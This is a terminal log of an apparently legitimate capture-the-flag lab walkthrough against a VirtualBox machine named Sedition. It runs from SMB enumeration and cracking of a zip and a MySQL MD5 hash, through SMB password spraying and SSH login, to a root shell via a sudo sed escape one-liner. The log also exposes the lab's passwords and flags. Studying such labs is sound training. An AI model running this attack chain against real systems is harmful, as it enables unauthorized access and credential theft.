┌──(kali㉿kali)-[~/Documents/sedition]
└─$ nmap -sS -p- --open --min-rate 5000 -n -Pn 10.0.250.6 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 10:42 EDT
Nmap scan report for 10.0.250.6
Host is up (0.00014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
65535/tcp open  unknown
MAC Address: 08:00:27:3F:E3:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
139,445,65535
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ nmap -p139,445,65535 -sCV -vvv -Pn -n 10.0.250.6 -oN fullscan.txt 

PORT      STATE SERVICE     REASON         VERSION
139/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 64 Samba smbd 4
65535/tcp open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG/Kzfk09iAKKpRuJrSfx4A4WiSlvP++mk2g5NcP7Bfva4A0l0SZxeDNKXB6iJN1++qyQWE2OUVzLrZ8Gdjkn+M=
|   256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILvZ909p40dk+Vi+xYHAfVXI4wI0XGPS/fgHXpFI2mRP
MAC Address: 08:00:27:3F:E3:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SEDITION<00>         Flags: <unique><active>
|   SEDITION<03>         Flags: <unique><active>
|   SEDITION<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2025-09-11T14:44:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 39699/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15226/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46382/udp): CLEAN (Failed to receive data)
|   Check 4 (port 54156/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: -1s

----
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ smbclient -L //10.0.250.6 -N 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      
        IPC$            IPC       IPC Service (Samba Server)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 10.0.250.6 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                                                                                
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ smbmap -H 10.0.250.6 -u '' -p ''

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
                                                                                                                                                                                       
[+] IP: 10.0.250.6:445  Name: 10.0.250.6                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        backup                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba Server)
        nobody                                                  NO ACCESS       Home Directories
[|] Closing connections..                                                                                          [/] Closing connections..                                                                                          [-] Closing connections..                                                                                          [*] Closed 1 connections                                                                            
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ smbmap -H 10.0.250.6 -u '' -p '' -r 'backup'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
[+] IP: 10.0.250.6:445  Name: 10.0.250.6                Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        backup                                                  READ ONLY
        ./backup
        dr--r--r--                0 Sun Jul  6 13:02:52 2025    .
        dr--r--r--                0 Sun Jul  6 14:15:13 2025    ..
        fr--r--r--              216 Sun Jul  6 13:02:31 2025    secretito.zip
        IPC$                                                    NO ACCESS       IPC Service (Samba Server)
        nobody                                                  NO ACCESS       Home Directories
                                                                     
  
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ smbclient //10.0.250.6/backup -N -c "get secretito.zip"
getting file \secretito.zip of size 216 as secretito.zip (21.1 KiloBytes/sec) (average 21.1 KiloBytes/sec)
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ ls
fullscan.txt  scan.txt  secretito.zip
    
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ unzip secretito.zip 
Archive:  secretito.zip
[secretito.zip] password password: 
   skipping: password                incorrect password
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ zip2john secretito.zip > zip_hash.txt
Created directory: /home/kali/.john
ver 1.0 efh 5455 efh 7875 secretito.zip/password PKZIP Encr: 2b chk, TS_chk, cmplen=34, decmplen=22, crc=F2E5967A ts=969D cs=969d type=0
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ cat zip_hash.txt 
secretito.zip/password:$pkzip$1*2*2*0*22*16*f2e5967a*0*42*0*22*969d*ee16b094213a1612e10c6608d4c2a170383b6b429176dfb6baac253a70a84e202ae7*$/pkzip$:password:secretito.zip::secretito.zip
 
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

sebastian        (secretito.zip/password)     

                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ unzip secretito.zip                      
Archive:  secretito.zip
[secretito.zip] password password: 
 extracting: password                
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ ls
fullscan.txt  password  scan.txt  secretito.zip  zip_hash.txt
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ cat password    
elbunkermolagollon123
                                                                                                                   
                                                                      

                                                                                                                   
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ netexec  smb 10.0.250.6 -u 'sebastian' -p 'elbunkermolagollon123' --users

SMB         10.0.250.6      445    SEDITION         [*] Unix - Samba (name:SEDITION) (domain:SEDITION) (signing:False) (SMBv1:False)                                                                                                  
SMB         10.0.250.6      445    SEDITION         [+] SEDITION\sebastian:elbunkermolagollon123 (Guest)
SMB         10.0.250.6      445    SEDITION         -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                           
SMB         10.0.250.6      445    SEDITION         cowboy                        2025-07-06 17:11:39 0        
SMB         10.0.250.6      445    SEDITION         [*] Enumerated 1 local users: SEDITION


                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ netexec  smb 10.0.250.6 -u 'cowboy' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep '+'
SMB                      10.0.250.6      445    SEDITION         [+] SEDITION\cowboy:sebastian 
                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ netexec  smb 10.0.250.6 -u 'cowboy' -p 'sebastian'                                                     
SMB         10.0.250.6      445    SEDITION         [*] Unix - Samba (name:SEDITION) (domain:SEDITION) (signing:False) (SMBv1:False)                                                                                                  
SMB         10.0.250.6      445    SEDITION         [+] SEDITION\cowboy:sebastian 


                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ ssh cowboy@10.0.250.6 -p 65535

cowboy@10.0.250.6's password: 
Linux Sedition 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul  6 20:00:56 2025 from 192.168.0.17
cowboy@Sedition:~$ ls
cowboy@Sedition:~$ pwd
/home/cowboy

cowboy@Sedition:/$ sudo -l
[sudo] contraseña para cowboy: 
Sorry, user cowboy may not run sudo on sedition.



cowboy@Sedition:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
cowboy:x:1001:1001:cowboy,,,:/home/cowboy:/bin/bash
mysql:x:102:110:MySQL Server,,,:/nonexistent:/bin/false




cowboy@Sedition:/$ netstat -tulpn
-bash: netstat: orden no encontrada
cowboy@Sedition:/$ ss -tulnp
Netid     State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process     
udp       UNCONN      0           0                      0.0.0.0:68                   0.0.0.0:*                    
udp       UNCONN      0           0                 10.0.250.255:137                  0.0.0.0:*                    
udp       UNCONN      0           0                   10.0.250.6:137                  0.0.0.0:*                    
udp       UNCONN      0           0                      0.0.0.0:137                  0.0.0.0:*                    
udp       UNCONN      0           0                 10.0.250.255:138                  0.0.0.0:*                    
udp       UNCONN      0           0                   10.0.250.6:138                  0.0.0.0:*                    
udp       UNCONN      0           0                      0.0.0.0:138                  0.0.0.0:*                    
tcp       LISTEN      0           128                    0.0.0.0:65535                0.0.0.0:*                    
tcp       LISTEN      0           50                     0.0.0.0:139                  0.0.0.0:*                    
tcp       LISTEN      0           50                     0.0.0.0:445                  0.0.0.0:*                    
tcp       LISTEN      0           80                   127.0.0.1:3306                 0.0.0.0:*                    
tcp       LISTEN      0           128                       [::]:65535                   [::]:*                    
tcp       LISTEN      0           50                        [::]:139                     [::]:*                    
tcp       LISTEN      0           50                        [::]:445                     [::]:*          

cowboy@Sedition:/$ mysql -u root -p   # Probar sin contraseña
Enter password: 
ERROR 1698 (28000): Access denied for user 'root'@'localhost'



cowboy@Sedition:/$ mysql -u cowboy -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 32
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,001 sec)

MariaDB [(none)]> 
MariaDB [(none)]> use bunker;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [bunker]> show tables;
+------------------+
| Tables_in_bunker |
+------------------+
| users            |
+------------------+
1 row in set (0,000 sec)

MariaDB [bunker]> select * from users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,000 sec)

MariaDB [bunker]> exit;
Bye

-----------------------------------------------



┌──(kali㉿kali)-[~/Documents/sedition]
└─$ echo "debian:7c6a180b36896a0a8c02787eeafb0e4c" > mysql_hash.txt

                                                                                                                   
┌──(kali㉿kali)-[~/Documents/sedition]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt mysql_hash.txt

password1        (debian)     

                                                                                                                   


--------------------------------------
cowboy@Sedition:/$ su debian
Contraseña: password1


debian@Sedition:/home$ cd debian/
debian@Sedition:~$ ls
backup  flag.txt
debian@Sedition:~$ cat flag.txt 
pinguinitopinguinazo




debian@Sedition:~$ sudo -l
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
debian@Sedition:~$ sudo sed -n '1e exec sh 1>&0' /etc/hosts
# 
# ls
backup  flag.txt
# whoami
root
# pwd
/home/debian
# cd /
# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   srv   tmp  var  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
laflagdelbunkerderootmolaaunmas
# 
